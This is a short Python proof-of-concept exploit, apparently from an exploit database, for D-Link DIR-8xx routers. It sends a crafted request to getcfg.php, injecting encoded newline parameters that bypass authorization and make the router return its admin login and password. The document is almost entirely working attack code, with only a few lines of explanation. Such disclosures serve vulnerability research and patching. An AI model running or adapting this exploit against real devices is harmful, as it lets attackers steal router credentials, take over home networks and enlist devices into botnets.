# phpcgi is responsible for processing requests to .php, .asp and .txt pages. Also, it checks whether a user is authorized or not. Nevertheless, if a request is crafted in a proper way, an attacker can easily bypass authorization and execute a script that returns a login and password to a router.
# E-DB Note: https://embedi.com/blog/enlarge-your-botnet-top-d-link-routers-dir8xx-d-link-routers-cruisin-bruisin
# E-DB Note: https://github.com/embedi/DIR8xx_PoC/blob/b0609957692f71da48fd7de28be0516b589187c3/phpcgi.py

import requests as rq

EQ = "%3d"
IP = "192.168.0.1"
PORT = "80"

def pair(key, value):
    return "%0a_POST_" + key + EQ + value

headers_multipart = {
    'CONTENT-TYPE' : 'application/x-www-form-urlencoded'
}

url = 'http://{ip}:{port}/getcfg.php'.format(ip=IP, port=PORT)
auth = "%0aAUTHORIZED_GROUP%3d1"
data = "A=A" + pair("SERVICES", "DEVICE.ACCOUNT") + auth

print(rq.get(url, data=data, headers=headers_multipart).text)